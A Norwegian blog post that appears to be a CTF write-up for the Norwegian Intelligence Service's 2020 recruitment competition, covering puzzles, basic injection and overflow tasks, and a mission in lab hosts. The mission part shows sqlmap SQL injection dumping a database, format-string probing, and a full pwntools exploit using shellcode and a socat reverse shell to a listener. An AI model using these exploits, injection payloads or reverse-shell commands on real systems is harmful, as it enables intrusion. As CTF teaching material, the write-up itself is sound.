---
layout: post
title: Etjenesten CTF
description: >
  Etterretningstjenestens oppdrag er å avdekke hva eller hvem som truer Norge og Norges interesser, og på den måten bidra til vern av Norge. For å lykkes må vi blant annet skaffe oss tilgang til informasjon. Dette gjør vi ved bruk av ulike metoder og teknikker. En av metodene kaller vi offensive cyberoperasjoner. Etterretningstjenesten er den virksomheten i Norge som gjennomfører offensive cyberoperasjoner.
  Etterretningstjenesten trenger folk som har potensial til å bli de aller beste innenfor dette fagfeltet, og vi ønsker å tilby talenter en jobb hos oss. De som er kvalifisert vil få et heltidskurs i offensive cyberoperasjoner før de starter sin operative tjeneste.
---
# Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet
* this unordered seed list will be replaced by toc as unordered list
{:toc}
## Introduksjon
![Banner for cybertalent CTF](/assets/img/blog/2020-etjenesten/E-Cyberops-Landingsside-banner.jpg)
Etteretningstjenesten har en åpen vurdering av aktuelle sikkerhetsutfordringer for Norge, som ble publisert i Fokus 2020.
[Fokus er Etterretningstjenestens åpne vurdering av aktuelle sikkerhetsutfordringer for Norge](https://forsvaret.no/fokus)
På side 78 av denne var det et hint til en CTF konkurranse, og denne ble også reklamert for.
Ved å gå til [https://ctf.cybertalent.no/](https://ctf.cybertalent.no/) så kunne man registrere seg og etterhvert delta på konkurransen.
Jeg endte opp på en finfin 21. plass til slutt og lærte mye på veien.
Konkurransen forgikk ved å bruke SSH for å komme seg inn på konkurranseserveren, hvor man kunne finne
noen dokumenter, litt historie, og de faktiske oppgavene.
Oppgavene var delt opp i Grunnleggende, Hjernetrim og Oppdrag.
La oss hoppe i det!

## Grunnleggende
### 1. Hvordan virker det.
    En kort forkaring over hvordan systemet virker og hvordan man kan registrere flagg man finner.
    
Her er det veldig grunnleggende, oppsett av scoreboard og hvordan registrere flagg.

~~~bash
scoreboard --set-name fjank
cat FLAGG
scoreboard FLAGG
~~~

### 2. Setuid basic
    En forklaring av hvordan setuid fungerer
      
Interessant, å bli introdusert for [setuid programmer](https://en.wikipedia.org/wiki/Setuid) som grunnleggende. 
Dette kan bli interessant. Setuid programmet ligger i samme katalog som vi står i, så det er bare å referere
til current katalog for å kjøre korrekt program.
~~~bash
./cat FLAGG
~~~

### 3. Basic injection
    En forklaring av hvordan command injection fungerer.

Basic [command injection](https://owasp.org/www-community/attacks/Command_Injection) løser denne enkelt.

~~~bash
./md5sum "FLAGG;cat FLAGG"
~~~

### 4. Basic buffer overflow
    En forklaring av hvordan en basic buffer overflow fungerer.
    
En svært enkelt buffer overflow med masse hjelp, man blir holdt i hånden hele veien.
~~~bash
cat overflow.c
export SHC=$(cat sample_shellcode)
/overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHabcdefghabcdefghabcdefgh000000
cat FLAGG
~~~    
    
### 5. Basic reverse engineering
    En grunnleggende introduksjon til reverse engineering.
    
Denne er også veldig basic, vi får et program og skal finne et passord. [Ghidra](https://ghidra-sre.org/) hjelper oss til å finne metoden
check_password, som med litt statisk analyse lett gir oss passordet "Reverse_engineering_er_morsomt__".
~~~c
undefined8 check_password(char *param_1)

{
  int iVar1;
  size_t sVar2;
  undefined8 uVar3;
  char local_16;
  undefined local_15;
  undefined local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  int local_c;
  
  sVar2 = strlen(param_1);
  if (sVar2 == 0x20) {
    iVar1 = strncmp("Reverse_engineering",param_1,0x13);
    if (iVar1 == 0) {
      if (param_1[0x13] == '_') {
        local_c = *(int *)(param_1 + 0x13);
        if (local_c == 0x5f72655f) {
          local_16 = 'm';
          local_15 = 0x6f;
          local_14 = 0x72;
          local_13 = 0x73;
          local_12 = 0x6f;
          local_11 = 0x6d;
          local_10 = 0x74;
          local_f = 0x5f;
          local_e = 0x5f;
          local_d = 0;
          iVar1 = strncmp(&local_16,param_1 + 0x17,10);
          if (iVar1 == 0) {
            uVar3 = 0;
          }
          else {
            uVar3 = 5;
          }
        }
        else {
          uVar3 = 4;
        }
      }
      else {
        uVar3 = 3;
      }
    }
    else {
      uVar3 = 2;
    }
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}
~~~ 

## Hjernetrim
### Lett - clmystery
    Her er det litt kjøreregler, man må finne en mistenkt, aller helst kun ved hjelp av command line.
    
Jo flinkere man er til kommandolinje, jo lettere blir denne. Vi begynner med å finne alle CLUE i crimescene.
~~~bash
grep CLUE crimescene
~~~
    CLUE: Footage from an ATM security camera is blurry but shows that the perpetrator is a tall male, at least 6'.
    CLUE: Found a wallet believed to belong to the killer: no ID, just loose change, and membership cards for AAA, Delta SkyMiles, the local library, and the Museum of Bash History. The cards are totally untraceable and have no name, for some reason.
    CLUE: Questioned the barista at the local coffee shop. He said a woman left right before they heard the shots. The name on her latte was Annabel, she had blond spiky hair and a New Zealand accent.

La oss sjekke det siste hintet:
~~~bash
grep Annabel people
~~~
    Annabel Sun     F       26      Hart Place, line 40
    Annabel Church  F       38      Buckingham Place, line 179

La oss sjekke Annabel Sun først
~~~bash
sed -n '39,41p' streets/Hart_Place
~~~
    SEE INTERVIEW #47246024

~~~bash
cat interviews/interview-47246024
~~~
    Ms. Sun has brown hair and is not from New Zealand.  Not the witness from the cafe.

Nuvel, da får vi se på Annabel Church da
~~~bash
sed -n '178,180p' streets/Buckingham_Place
~~~
    SEE INTERVIEW #699607

~~~bash
cat interviews/interview-699607
~~~
    Interviewed Ms. Church at 2:04 pm.  
    Witness stated that she did not see anyone she could identify as the shooter, 
    that she ran away as soon as the shots were fired.
    However, she reports seeing the car that fled the scene.  
    Describes it as a blue Honda, with a license plate that starts with "L337" and ends with "9"
    
~~~bash
grep -A3 "^License Plate L337.*9$" vehicles | grep -A2 "^Make: Honda$" | grep -A1 "^Color: Blue$"
~~~
    Owner: Erika Owens
    Owner: Aron Pilhofer
    Owner: Heather Billings
    Owner: Joe Germuska
    Owner: Victor Sidney
    Owner: Jacqui Maher
    Erika Owens     F       56      Trapelo Street, line 98
    Aron Pilhofer   M       16      Claybourne Street, line 145
    Heather Billings        F       38      Culbert Street, line 19
    Joe Germuska    M       65      Plainfield Street, line 275
    Victor Sidney   M       34      Dunstable Road, line 284
    Jacqui Maher    F       40      Andover Road, line 224
 
~~~bash
sed -n '98,98p' streets/Trapelo_Street
sed -n '145,145p' streets/Claybourne_Street
sed -n '19,19p' streets/Culbert_Street
sed -n '275,275p' streets/Plainfield_Street
sed -n '284,284p' streets/Dunstable_Road
sed -n '224,224p' streets/Andover_Road
~~~
    SEE INTERVIEW #5455315
    SEE INTERVIEW #1767435
    SEE INTERVIEW #2939888
    SEE INTERVIEW #29741223
    SEE INTERVIEW #9620713
    SEE INTERVIEW #904020
    
~~~bash
cat interviews/interview-5455315
cat interviews/interview-1767435
cat interviews/interview-2939888
cat interviews/interview-29741223
cat interviews/interview-9620713
cat interviews/interview-904020
~~~
    Victor Sidney:
    Home appears to be empty, no answer at the door.
    After questioning neighbors, appears that the occupant may have left for a trip recently.
    Considered a suspect until proven otherwise, but would have to eliminate other suspects to confirm.
    
En rask liten sjekk i membercard registeret viser at Victor Sidney har medlemsskap i alle klubbene, 
Victor Sidney er morderen.

### Knock knock
    vi får en video, og kun det.

Det er ikke ut til at det er noe skjulte filer i videoen eller. 
Videoen er av en dukke som banker på et gjerde, jeg tipper på morsekode så jeg henter ut lyden og dumper den inn i [audacity](https://www.audacityteam.org/)
for manuell analysering. Det viser seg at det sannsynligvis IKKE er morse, for der ble resultatet bare søppel.
Videoen avsluttes med to matematiske konstruksjoner:

$$ A = [a_{ij}]_{n,m} $$  
$$ A^T = [a_{ji}]_{m,n} $$

Dette er en standard måte å definere en matrise og den [transponerte matrisen](https://en.wikipedia.org/wiki/Transpose).
Kan hente meldingen ligger skjult i lyden, og ved å transponere, så kan man få ut noe fornuftig? Men det er ikke tilfelle.
[exiftool](https://exiftool.org/) gir oss litt ekstra informasjon:
Filmen er laget vha Adobe Premiere, den ligger i folder kensentme (Ken sent me). Jeg finner ikke ut av noe ekstra med
denne informasjonen, men det at filmen heter knock knock, og den har en matrise som avslutning hinter til at det er en
[tap cipher](https://en.wikipedia.org/wiki/Tap_code).
Ved å registrere taps (lett med audacity) og punche inn i [https://www.dcode.fr/tap-cipher](https://www.dcode.fr/tap-cipher)
så får vi resultatet: ORDETDULETERETTERERTAPDANCE, altså TAP DANCE.
 

### Lett - runer
    Her får vi presentert et bilde an noe som ser ut som runer.

![runer.webp](/assets/img/blog/2020-etjenesten/runer.webp)

Ved å lese litt om runer og futhark, så kan man oversette runene til latinsk alfabet, og vi får dette resultatet:
    
    AUTFH
    NKRRU
    IREER
    ETENR
    TSASN

Første linje leses nesten som futhark, så ved å skyfle litt rundt på kolonnene (42351), så får man en fornuftig setning.
futharkrunererinteressant


### Lett - Sharing secrets
    Her får vi en introduksjon til Sharing secrets.

Denne krever at man faktisk kjører et program for å løse, og man finner det man trenger på [wikipedia](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing).
Jeg hadde litt problemer med å løse denne, men det var fordi jeg ikke er noe spesiellt flink til å lese hint.
Ved å løse oppgaver, så får man flere og flere secrets tilgjengelig får å løse for k=3, k=4 osv.
Etterhvert som oppgaver blir løst, er det bare å gå tilbake til denne, legge inn secrets, få ut svaret og punche inn i
scoreboard.


### Middels - Artwork
    Her får vi et bilde.
   
![Artwork](/assets/img/blog/2020-etjenesten/dbc6486d9c1788ccce2f4ece3e498fb3.png)
Her måtte jeg få et lite hint som dyttet meg i riktig retning, men ellers så var denne grei.
Filnavnet er en hash, som lett kan crackes til "esoteric". I bildet er det en tekst, "intellect confuses intuition".
Toppen av bildet ser ut til å være akkurat samme som bunnen, bare invertert. fire horisontale linjer, en haug 
vertikale linjer i forskjellig lengde og farge, pluss en krøll her og der.
Steganalyse av bildet gir meg ingenting. Jeg begynte på å finne et mønster for bredde for å se om det kunne være bokstaver som faktisk er enkodet.
På dette tidspunkt fikk jeg et hint om å bruke mine ville Google foo skillz, som til slutt sa hva dette bildet faktisk er.
Assembled Piet Code.
[https://www.bertnase.de/npiet/](https://www.bertnase.de/npiet/)
[https://www.dangermouse.net/esoteric/piet/samples.html](https://www.dangermouse.net/esoteric/piet/samples.html)

Ved å bruke en [online tjeneste for piet](https://www.bertnase.de/npiet/npiet-execute.php), så fikk vi iallefall noe fornuftig ut.
    
    Part 1: HAVAL('mondrian')
    Part 2: Enter password:

Nok et online tool for HAVAL ga oss korrekt svar på del 1.
[http://www.unit-conversion.info/texttools/haval/](http://www.unit-conversion.info/texttools/haval/).
For del to så måtte jeg gå litt hardere til verks. Jeg begynte med [https://github.com/Ramblurr/PietCreator](https://github.com/Ramblurr/PietCreator)
som er et gui for å skrive Piet Programmer, og den fikk lett til å åpne bildet.
Ved å leke litt med å bytte ut instruksjoner med NOP så kom jeg endelig fram til hva som skjer etter at man har skrevet inn et passord, 
og der ser det ut til at en og en bokstav blir sjekket vha litt matematikk.
dette programmet var ugruelig ustabilt, så jeg byttet til [npiet](https://www.bertnase.de/npiet/), og aktiverte
trace funksjonen for å se hvordan stacken var hvis jeg sendte inn en A som passord.
det var meningen at stacken skulle ende opp etter hver bokstav med ett element, men hvis en bokstav var feil så ender
stacken opp en to elementer, hvor det ene elementet faktisk er offset fra korrekt bokstav til A.
Litt kalkulator og bokstav for bokstav så fikk jeg bygd opp passordet som jeg har glemt å notert ned, 
men såvidt jeg husker var det Tr0ub4dor&3.
Ved å punche inn dette passordet får man correct horse battery stable. Finfin referanse til [xkcd](https://xkcd.com/936/).

### Middels - Explosion
    Vi får et binærprogram, hvor vi må reversere for å forstå hvordan dette fungerer.

Nope! Denne tok jeg ikke i det hele tatt.

## Selve Oppdraget
Denne seksjonen blir ikke så veldig strukturert, og sannsynligvis en blanding av norsk og engelsk, 
for den blir skrevet lenge etter at den ble gjort og notatene mine fra den tiden har rom for forbedringer.
Jeg dumper det uansett ut relativt uformattert. 😌

## Situasjon
    Vi har mottatt informasjon om at en ukjent trusselaktør har fått tilgang
    til maskiner knyttet til et av våre departementer. Basert på nåværende
    situasjonsforståelse er det lite som er kjent om hendelsesforløpet. Trusselen
    kommer fra en aktør i utlandet, trolig en aktør med omfattende ressurser.

    Initiell analyse tilsier at aktøren eksfiltrerer data til domenet
    cloud-c2-70, på port 1337/TCP. Formatet er ukjent.

    Det er også observert trafikk knyttet til aktøren mot denne nettadressen:
    http://keystore/query.php?keyname=oper@cloud-mgr-15

## Oppdrag
    Vi trenger informasjon om trusselaktørens kapabiliteter og intensjon.

    Initielt ønsker vi å få vite hvem som lastet opp nøkler til
    keystore.

    Videre er din oppgave er å få tilgang til serveren cloud-c2-70
    og forsøke å avdekke hva som er stjålet i angrepet. Informasjon om
    trusselaktørens verktøy, infrastruktur, sertifikater og nøkler kan også
    være av interesse.

    Viktig: Før du kan sette i gang med oppdraget må du logge ut og
    kjøre kommandoen:

    ────────────────────
    $ ssh login@ctf.cybertalent.no START-OPPDRAG
    ────────────────────

    Lykke til!

## SQL injection
Uploaded sqlmap, and found that the keyname is vulnerable to sql injection.
~~~bash
python3 sqlmap.py -v -u http://keystore/query.php?keyname=oper@cloud-mgr-15 --random-agent --delay=5
~~~
so, what now? poke around in the db a bit first.
~~~bash
python3 sqlmap.py -v -u http://keystore/query.php?keyname=oper@cloud-mgr-15 --random-agent --delay=6 -bck-end DBMS: MySQL >= 5.0.12
banner: '8.0.19'

--current-user
current user: 'keystore@%'

--current-db
current database: 'keystore'

--is-dba
False

--users
[*] 'keystore'@'%'

--passwords
No results.

--privileges 
privilege: USAGE

--roles
role: USAGE

--dbs
information_schema
keystore

-D keystore --tables
[3 tables]
+-----------------+
| keystore        |
| user_key_upload |
| userstore       |
+-----------------+

-D keystore --dump
actual key id 17693
uploaded:  
key_id, user_id, time
17693,20524,1083438277
user uploaded:
user_id,user_name,user_password
20524,Elliot Alderson,014aedf1bc63277183ae5034c023c8ba
~~~
## Whats next?
Vi fikk litt mer informasjon:
    Vi har indikasjoner på at aktørens kryptonøkkel-generator har en bakdør. Kan du undersøke videre?

Her gikk jeg litt i alle retninger før jeg fant ut hvor jeg skulle videre.
Litt mer SQL injection.
same user has uploaded several keys:
~~~bash
12072,20524,1555605348
13941,20524,986626492
14074,20524,1291346859
14347,20524,1410200316
15572,20524,1111329525
15887,20524,1332499533
16048,20524,1026833399
16986,20524,1437342107
17245,20524,1072842646
17462,20524,1529238164
17693,20524,1083438277
18008,20524,1176764506
18358,20524,1236242269
18407,20524,1098316055
18435,20524,1100795486
18456,20524,1111066872
18617,20524,1359818045
18813,20524,1304052798
18876,20524,1237690662
19044,20524,1010123619
19408,20524,959551014
~~~
Almost all of them are active. Can this be exploited? Obviously not with my knowledge at this point,
but exploration is allowed. 😁
We can probably look closer at [Upgrade Your SSH Key to Ed25519](https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54)
Looking at RsaCtfTool and RSHack, try to see what we got with our two public keys.
[RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
[RSHack](https://github.com/zweisamkeit/RSHack)

Starting with cloud-hq-42
Of the keys, these servers are active:
    cloud-hq-42
      ports open: 22 
    cloud-c2-70

Found nothing for RSA, but I have connection to the cloud-c2-70 1337 server.
Trying to figure out how this works.
~~~bash
netcat cloud-c2-70 1337
> help
/lootd: available commands: help, upload, download, uname, uptime
> tut
./lootd: unknown command: 'tut'
~~~
I fuzzed manually to see if any characters was behaving unormally.
download and upload takes parameters, which we can break with segmentation fault.
~~~bash
%e - ./lootd: unknown command: '6.922279e-310'
%u - ./lootd: unknown command: '2753872103'
%i - ./lootd: unknown command: '-1541095193'
%o - ./lootd: unknown command: '24411140347'
%p - ./lootd: unknown command: '0x5628a424c0e7'
%a - ./lootd: unknown command: '0x1.fdb6326547p-1028'
%d same as %u
%f - ./lootd: unknown command: '0.000000'
%g - almost same as %e
%x -  ./lootd: unknown command: '12a960e7'
%m - ./lootd: unknown command: 'Invalid argument/No error information'
%n - goes into another context.
'%n ' - ./lootd SIG#11 Segmentation fault
./lootd: unknown command: '
~~~
I had no idea what to do next, but after some googling:
ooooo, a format string vulnerability?
~~~bash
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
./lootd: unknown command: '0x55a76b1490e7 0xffffffff 0 0x7fff34c75da8 0 0x7fff34c75ff0 0x55a76b148af6 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x70252070 0 0'
~~~
Oh yes, now to figure out how to exploit this, as I have never done something like this before. 🙄
Step by step (and RTFM):
[DEFCON-18-presentation](https://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf)
Also check out the youtube videos for these slides.
Deep insight:
[Good old paper](https://www.win.tue.nl/~aeb/linux/hh/formats-teso.html)
read documentation for [python pwntools](https://github.com/Gallopsled/pwntools) fmtstr
Also bought the book [Computer  Internet Security](https://www.handsonsecurity.net/)
Ok, Lets try to write our own exploiter.
Start by writing a skeleton that send code to the server first, and retrieve the results.
actually trying pwntools, perhaps I cxan learn something new.
Seems it's a buffer overflow, 135 chars is ok, 136 crashes.
Back to pwntools.
Ok, leaking 64 bit addresses.
~~~bash
1. 0x55d932f4f0e7	# crash for string
2. 0xffffffff		# always ffffffff
3. 0			# always 0
4. 0x7ffc56f968d8	# empty string
5. 0			# always 0
6. 0x7ffc56f96b20	# Pointer to MY string! this is where we will drop our exploit
7. 0x55d932f4eaf6	# "xeb\x11H\x8d=Q\x07" ??
8. 0x70252c70252c7025	# Start of string
9. 0x252c70252c70252c	# string continues
~~~
So, by using a leaked stack address from the printf vulnerable code, and the constructing a buffer overflow payload, I was able to the a full blown shell on the server!
Mind you, I used better parts of 3-5 days reading, trying something, reading some more, trying some more, before I understood what I had to to,
not least actually implement it.
~~~python
#!/usr/bin/python3

from pwn import *
# Connect to server
c = remote('cloud-c2-70', 1337)
# read until prompt
c.recvuntil('> ', drop=True)

# Get the pointer to the start of the buffer, stored in leaked_start
probe = b'%p,'*6 \
        + b'%p,' \
        + b'%p,'*20 \
        + b'\n'
c.send(probe)
line = c.recvline()
leaked_start = int(line.split(b',')[5], 16)
log.info('Got pointer to start of buffer.')
# ok now we overflow the buffer
# instead of using a regular padding, we spray the heap with our pointer. we need at least 17 to overflow.
# start with a complete buffer of 400, filled with NOP
strSize = 400
numberOfPtr = 21

shellcode =b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62" \
      + b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31" \
      + b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c" \
      + b"\x58\x0f\x05"
nopSledSize = strSize - len(shellcode) - 4 - (numberOfPtr * 8)
ptr = p64(leaked_start + (numberOfPtr * 8) + int(nopSledSize / 2)) * numberOfPtr
send_str = ptr + (b'\x90'*nopSledSize) + shellcode + b'\n'
log.info('Sending buffer overflow')
c.send(send_str)
# at this point, we now have a shell.
# Instead of doing interactive(), we fire up a reverse shell.
# the lootd daemon is started with socat, so we can use socat to get a descent
# reverse shell. do remember to start the reverse shell listener.
# socat file:`tty`,raw,echo=0 tcp-listen:9001
c.recvuntil('> ', drop=True)
log.info('Got shell access, spawning reverse shell')
c.send(b'socat exec:\'ash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.77.100:9001')
c.close()
~~~
Interesting enough, by using the command download with parameter lootd we get a hexdump of the actual binary file.
I figured out this after I had exploited. I could have used ghidra to reverse the binary and find the vulnerabilities
without doing the insane amounts of guesswork I did.
Anyway, here is the code to extract the binary from the hexdump to be able to analyse it in ghidra.
~~~python
file = open('lootd.txt')
str = ''
for line in file:
    str += line[10:58]

arr = str.split(' ')
bytes = b''
for x in arr:
    if x == '':
        continue
    bytes += int(x, 16).to_bytes(1, 'big')

result = open('lootd', 'wb')
result.write(bytes)
result.close()
~~~


Og her faller writeupen fra hverandre, iom at notatene mine var på en VM som i etterkant har blitt slettet.😪
Jeg hamret iallefall videre og klarte til slutt å komme igjennom hele, en rimelig bratt læringskurve.
Flere gode writeups for veien videre, e.g.
[Sigve Indregard](https://www.indregard.no/2020/03/e-tjenestens-ctf/)


## Til slutt
🙌🙌 Takk for at du tok deg tid til å lese alt, trykk på recommend og legg inn en kommentar! 🙌🙌